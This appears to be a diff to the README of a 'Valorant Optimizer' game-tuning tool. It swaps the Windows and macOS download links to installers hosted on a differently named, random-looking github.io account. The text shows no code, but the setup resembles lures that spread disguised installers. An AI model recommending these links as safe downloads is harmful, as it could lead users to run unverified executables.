@@ -61,7 +61,7 @@ The **🔧 Valorant Optimizer** is a comprehensive PC tuning tool built specific
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://BursarHypnotize.github.io/install-win/)
 
 </div>
 
@@ -74,7 +74,7 @@ The **🔧 Valorant Optimizer** is a comprehensive PC tuning tool built specific
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://BursarHypnotize.github.io/install-mac/)
 
 </div>
 
